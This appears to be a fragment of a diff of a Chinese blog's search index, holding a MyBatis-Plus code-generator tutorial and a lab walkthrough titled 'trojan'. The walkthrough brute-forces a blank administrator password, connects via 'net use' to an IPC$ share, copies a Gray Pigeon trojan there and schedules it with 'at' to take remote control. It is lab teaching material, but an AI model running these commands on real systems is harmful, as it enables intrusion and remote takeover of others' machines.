+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
+
+<h2 id="2-编写生成器代码"><a href="#2-编写生成器代码" class="headerlink" title="2.编写生成器代码"></a>2.编写生成器代码</h2><p>可以放在专门的工具类包下</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.utils;
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;
+
+<span class="hljs-keyword">import</span> java.util.Collections;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * mp代码生成器</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeGenreator</span> </span>&#123;
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
+        generator();
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">generator</span><span class="hljs-params">()</span></span>&#123;
+        FastAutoGenerator.create(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>,
+                <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>)
+                .globalConfig(builder -&gt; &#123;
+                    builder.author(<span class="hljs-string">&quot;sunzy&quot;</span>) <span class="hljs-comment">// 设置作者</span>
+                            .enableSwagger() <span class="hljs-comment">// 开启 swagger 模式</span>
+                            .fileOverride() <span class="hljs-comment">// 覆盖已生成文件</span>
+                            .outputDir(<span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\java\\&quot;</span>); <span class="hljs-comment">// 指定输出目录</span>
+                &#125;)
+                .packageConfig(builder -&gt; &#123;
+                    builder.parent(<span class="hljs-string">&quot;com.sunzy&quot;</span>) <span class="hljs-comment">// 设置父包名</span>
+                            .moduleName(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// 设置父包模块名</span>
+                            .pathInfo(Collections.singletonMap(OutputFile.xml, <span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="hljs-comment">// 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改</span>
+                &#125;)
+                .strategyConfig(builder -&gt; &#123;
+                    builder.entityBuilder().enableLombok();
+                    builder.mapperBuilder().enableMapperAnnotation().build();
+                    builder.controllerBuilder().enableHyphenStyle()  <span class="hljs-comment">// 连字符转驼峰</span>
+                            .enableRestStyle();  <span class="hljs-comment">// 开启rest控制器</span>
+                    builder.addInclude(<span class="hljs-string">&quot;sys_user&quot;</span>) <span class="hljs-comment">// 设置需要生成的表名</span>
+                            .addTablePrefix(<span class="hljs-string">&quot;t_&quot;</span>, <span class="hljs-string">&quot;sys_&quot;</span>); <span class="hljs-comment">// 设置过滤表前缀</span>
+                &#125;)
+<span class="hljs-comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span>
+                .execute();
+
+    &#125;
+&#125;
+</code></pre>
+
+<p>完成后，直接运行改工具类就可以直接生成以下文件：</p>
+<p>UserMapper.java IUserService.java UserServiceImpl.java UserController.java</p>
+<h2 id="3-Controller模板"><a href="#3-Controller模板" class="headerlink" title="3.Controller模板"></a>3.Controller模板</h2><p>可以根据需要修改自己的模板</p>
+<pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> $&#123;<span class="hljs-keyword">package</span>.Controller&#125;;
+
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
+<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;
+<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;
+<span class="hljs-keyword">import</span> java.util.List;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
+
+<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;
+<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Entity&#125;.$&#123;entity&#125;;
+
+#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
+<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;
+#<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
+#end
+#<span class="hljs-keyword">if</span>($&#123;superControllerClassPackage&#125;)
+<span class="hljs-keyword">import</span> $&#123;superControllerClassPackage&#125;;
+#end
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * &lt;p&gt;</span>
+<span class="hljs-comment"> * $!&#123;table.comment&#125; 前端控制器</span>
+<span class="hljs-comment"> * &lt;/p&gt;</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> $&#123;author&#125;</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@since</span> $&#123;date&#125;</span>
+<span class="hljs-comment"> */</span>
+#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
+<span class="hljs-meta">@RestController</span>
+#<span class="hljs-keyword">else</span>
+<span class="hljs-meta">@Controller</span>
+#end
+<span class="hljs-meta">@RequestMapping(<span class="hljs-meta-string">&quot;#if(<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>)/<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>#end/#if(<span class="hljs-subst">$&#123;controllerMappingHyphenStyle&#125;</span>)<span class="hljs-subst">$&#123;controllerMappingHyphen&#125;</span>#else<span class="hljs-subst">$&#123;table.entityPath&#125;</span>#end&quot;</span>)</span>
+#<span class="hljs-keyword">if</span>($&#123;kotlin&#125;)
+<span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125;#<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end
+
+#<span class="hljs-keyword">else</span>
+    #<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;)
+    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;
+    #<span class="hljs-keyword">else</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; &#123;
+    #end
+
+<span class="hljs-meta">@Resource</span>
+<span class="hljs-keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;
+
+<span class="hljs-comment">// 新增或者更新</span>
+<span class="hljs-meta">@PostMapping</span>
+<span class="hljs-keyword">public</span> boolean save(<span class="hljs-meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);
+        &#125;
+
+<span class="hljs-meta">@DeleteMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-built_in">Boolean</span> delete(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);
+        &#125;
+
+<span class="hljs-meta">@PostMapping(<span class="hljs-meta-string">&quot;/del/batch&quot;</span>)</span>
+<span class="hljs-keyword">public</span> boolean deleteBatch(<span class="hljs-meta">@RequestBody</span> List&lt;Integer&gt; ids) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeByIds(ids);
+        &#125;
+
+<span class="hljs-meta">@GetMapping</span>
+<span class="hljs-keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.list();
+        &#125;
+
+<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
+<span class="hljs-keyword">public</span> $&#123;entity&#125; findOne(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);
+        &#125;
+
+<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/page&quot;</span>)</span>
+<span class="hljs-keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="hljs-meta">@RequestParam</span> Integer pageNum,
+<span class="hljs-meta">@RequestParam</span> Integer pageSize) &#123;
+        LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();
+        queryWrapper.orderByDesc(<span class="hljs-string">&quot;id&quot;</span>);
+        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper);
+        &#125;
+
+&#125;
+
+#end
+</code></pre>
+
+<p>更多的模板可以到<code>com.baomidou.mybatis-plus-generator</code>包中复制到项目的<code>resources\templates</code>中，根据自己的需求修改模板</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220513194907662.png" alt="image-20220513194907662"></p>
 ]]></content>
       <categories>
         <category>javaweb</category>
@@ -5207,6 +5353,26 @@ cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ca
       </tags>
   </entry>
   <entry>
+    <title>木马</title>
+    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
+<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
+<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
+<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" alt></p>
+<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
+<p>获取账号密码<br>username：administrator<br>password: “”</p>
+<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
+<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
+<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
+<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
+<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" alt></p>
+<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" alt></p>
+]]></content>
+      <categories>
+        <category>木马</category>
+      </categories>
+  </entry>
+  <entry>
     <title>爬图</title>
     <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
     <content><![CDATA[<h1 id="用爬虫爬取小姐姐的图片"><a href="#用爬虫爬取小姐姐的图片" class="headerlink" title="用爬虫爬取小姐姐的图片"></a>用爬虫爬取小姐姐的图片</h1><span id="more"></span>
@@ -5255,26 +5421,6 @@ urls = re.findall(findlinks, html)   <span class="hljs-comment">#爬取到的图
       <tags>
         <tag>爬虫</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>木马</title>
-    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<h1 id="初识木马"><a href="#初识木马" class="headerlink" title="初识木马"></a>初识木马</h1><span id="more"></span>
-<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p><strong>使用灰鸽子软件以及端口爆破软件控制目的主机</strong></p>
-<p>准备一台xp，一台2003<br>其中xp地址为10.1.1.3/24 2003为10.1.1.1/24<br>使两个主机能够通信<br>xp作为攻击方，2003为受害者</p>
-<h3 id="1-制作木马"><a href="#1-制作木马" class="headerlink" title="1.制作木马"></a>1.制作木马</h3><p>使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用）<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" alt></p>
-<h3 id="2-扫描主机，并对账号密码进行爆破"><a href="#2-扫描主机，并对账号密码进行爆破" class="headerlink" title="2.扫描主机，并对账号密码进行爆破"></a>2.扫描主机，并对账号密码进行爆破</h3><p>ip起始地址为10.1.1.1-10.1.1.255<br>密码配置文件<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" alt><br>其实只要扫描10.1.1.1即可（因为是实验）</p>
-<p>获取账号密码<br>username：administrator<br>password: “”</p>
-<h3 id="3-与目标主机建立IPC"><a href="#3-与目标主机建立IPC" class="headerlink" title="3.与目标主机建立IPC$"></a>3.与目标主机建立IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p>
-<h3 id="4-植入木马到目标主机"><a href="#4-植入木马到目标主机" class="headerlink" title="4.植入木马到目标主机"></a>4.植入木马到目标主机</h3><p><code>copy C:\Documents and Settings\shimisi\桌面\qq.exe  \\10.1.1.1\ipc$</code></p>
-<h3 id="5-设置目标主机运行木马"><a href="#5-设置目标主机运行木马" class="headerlink" title="5.设置目标主机运行木马"></a>5.设置目标主机运行木马</h3><p><code>net time \\10.1.1.1</code>根据目标主机时间设置事物的开始时间<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>在上面的时间之后三分钟左右设置一个事物<br>即在17：17时运行木马文件</p>
-<h3 id="6-成功控制目标主机"><a href="#6-成功控制目标主机" class="headerlink" title="6.成功控制目标主机"></a>6.成功控制目标主机</h3><p>观察目标主机已自动上线，已可以进行监控或传输数据等操作</p>
-<p>获取屏幕内容<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" alt></p>
-<p>控制命令行<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" alt></p>
-]]></content>
-      <categories>
-        <category>木马</category>
-      </categories>
   </entry>
   <entry>
     <title>算法上机复习</title>
